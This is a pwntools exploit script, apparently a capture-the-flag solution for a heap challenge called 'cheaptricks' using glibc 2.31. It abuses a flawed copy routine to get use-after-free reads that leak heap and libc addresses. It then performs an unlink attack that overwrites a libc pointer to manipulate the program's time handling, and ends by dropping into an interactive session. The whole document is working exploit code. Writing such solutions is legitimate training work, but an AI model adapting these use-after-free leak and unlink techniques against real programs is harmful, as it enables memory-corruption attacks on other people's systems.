from pwn import *

#init

e = ELF('./cheaptricks')
libc = ELF('./libc-2.31.so')

p = process(e.path)
#p = remote('35.204.150.107', 1337)

#funcs

def addp(s = 'a'):
    p.sendlineafter('?', '1')
    p.sendlineafter('?', str(len(s)));
    p.sendlineafter('.', s)
    p.sendlineafter('.', '69')
    p.sendlineafter('.', '69')
    p.sendlineafter('.', '69')

def addr(x, s = 'a'):
    p.sendlineafter('?', '2')
    p.sendlineafter('.', str(x))
    p.sendlineafter('.', '69')
    p.sendlineafter('?', str(len(s)))
    p.sendlineafter('.', s)

def frer(x, y = 'a'):
    p.sendlineafter('?', '3')
    p.sendlineafter('.', str(x))
    p.sendlineafter('?', str(y))

def rd(x):
    p.sendlineafter('?', '4')
    p.sendlineafter('?', str(x))
    p.recvuntil('Description: ')
    return u64(p.recvline(keepends = False).ljust(8, b'\x00'))

def cpy(x):
    p.sendlineafter('?', '5')
    p.sendlineafter('?', str(x))

def tm():
    p.sendlineafter('?', '6')
    p.recvuntil('Jul ')
    x = int(p.recvuntil(' ', drop = True)) * 24 * 60 * 60
    x += int(p.recvuntil(':', drop = True)) * 60 * 60
    x += int(p.recvuntil(':', drop = True)) * 60
    x += int(p.recvuntil(' ', drop = True))
    return x

#vars

leettime = 20 * 24 * 60 * 60 + 13 * 60 * 60 + 37 * 60 + 42
timezone = 0xffffb9b0
main_arena_off = 0x1bebe0
types_off = 0x1c2240

log.info('Leet time: ' + hex(leettime))
log.info('Timezone: ' + hex(timezone))
log.info('Main arena libc off: ' + hex(main_arena_off))
log.info('Types libc off: ' + hex(types_off))

#exploit

#bad copying mechanism doesn't change bk ptrs, gives read after free to leak heap address

addp() #0

addr(0)
addr(0)

cpy(0) #1

frer(0, 0)
frer(1, 0)

heap = rd(1) - 0x1370

log.info('Heap adr: ' + hex(heap))

#do same thing with larger size to leak libc address

addp() #2

addr(2, 'a' * 0x500)
addr(2)

cpy(2) #3

frer(3, 0)

libc_off = rd(3) - main_arena_off

log.info('Libc off adr: ' + hex(libc_off))

#get the current time

curtime = tm()

log.info('Cur time: ' + hex(curtime))

#make string size of review struct to overwrite fd and bk ptrs than use uaf for unlink attack overwriting types

addp(p64(heap + 0x1b20) + p64(libc_off + types_off) + b'a' * 0x8 + p64(heap + 0x12b0)) #4

frer(3, 0)

#now we change time relatively since we pointed types ptr to controllable area

addp(b'a' * 0x8 + p64(timezone + leettime - curtime) + b'a' * 0x10)

#call time since it should be leettime now

tm()

#pray for flag

p.interactive()
